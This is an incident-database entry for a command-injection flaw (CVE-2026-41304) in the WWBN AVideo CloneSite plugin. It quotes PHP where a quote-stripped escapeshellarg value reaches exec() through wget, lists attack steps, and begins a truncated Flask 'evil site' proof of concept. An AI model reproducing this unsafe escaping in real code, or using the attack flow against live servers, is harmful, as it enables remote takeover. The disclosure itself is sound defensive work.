---
title: "INC-08836 — WWBN AVideo: RCE cause by clonesite plugin"
layout: incident
permalink: /incident/INC-08836.html
incident_id: INC-08836
year: 2026
severity: High
description_preview: "Description ## Summary The `cloneServer.json.php` endpoint in the CloneSite plugin constructs shell commands using user-controlled input (`url` parameter) without proper sanitization. The input is dir"
tags_str: "command-injection, cve, ghsa, wwbn-avideo"
---

{% raw %}
<div class="incident-anchor" id="inc-08836" markdown="1">

### INC-08836  [↗](/incident/INC-08836.html)

**WWBN AVideo: RCE cause by clonesite plugin**  
_2026-04 · vulnerability-disclosure · Severity: High_

CVEs: `CVE-2026-41304`
CWEs: `CWE-77`, `CWE-78`
CVSS: **9.8** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

Description ## Summary The `cloneServer.json.php` endpoint in the CloneSite plugin constructs shell commands using user-controlled input (`url` parameter) without proper sanitization. The input is directly concatenated into a `wget` command executed via `exec()`, allowing command injection. An attacker can inject arbitrary shell commands by breaking out of the intended URL context using shell metacharacters (e.g., `;`). This leads to **Remote Code Execution (RCE)** on the server. ## Details Inside `plugin/CloneSite/cloneClient.json.php`(line112) didn't have proper sanitization ```php $objClone->cloneSiteURL = str_replace("'", '', escapeshellarg($objClone->cloneSiteURL)); ``` use `str_replace ` make `'` added by `escapeshellarg` become ` ` so hacker can inject evil `cloneSiteURL` to rce ```php $sqlURL = "{$objClone->cloneSiteURL}videos/clones/{$json->sqlFile}"; \\116 $cmd = "wget -O {$sqlFile} {$sqlURL}"; \\117 exec($cmd . " 2>&1", $output, $return_val); \\119 ``` The attack flow 1. make a evil site to provide date 2. add evil url in `objects/pluginAddDataObject.json.php` 3. access `plugin/CloneSite/cloneClient.json.php` to trigger rce ## Poc make a evil site use python like this ```python from flask import Flask, jsonify, request app = Flask(__name__) @app.route('/', defaults={'path': ''}) @app.route('/<path:path>') def catch_all(path): print("PATH:", path) return jsonify({ "error": False, "msg": "",

**Affected:** composer/wwbn/avideo  
**Attack vector:** `command-injection`  

**OWASP LLM Top 10:** `LLM03`, `LLM05`  
**OWASP Agentic (ASI):** `ASI04`, `ASI05`  
**NIST AI RMF:** `GOVERN-6.1`, `MEASURE-2.7`  
**MITRE ATLAS:** `AML.T0010`, `AML.T0050`  

**References:**
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-41304) _(advisory)_
- [GHSA-xr6f-h4x7-r6qp](https://github.com/advisories/GHSA-xr6f-h4x7-r6qp) _(advisory)_
- [https://github.com/WWBN/AVideo/security/advisories/GHSA-xr6f-h4x7-r6qp](https://github.com/WWBN/AVideo/security/advisories/GHSA-xr6f-h4x7-r6qp) _(reference)_
- [https://github.com/WWBN/AVideo/commit/473c609fc2defdea8b937b00e86ce88eba1f15bb](https://github.com/WWBN/AVideo/commit/473c609fc2defdea8b937b00e86ce88eba1f15bb) _(reference)_

**Tags:** `command-injection`, `cve`, `ghsa`, `wwbn-avideo`

</div>

{% endraw %}
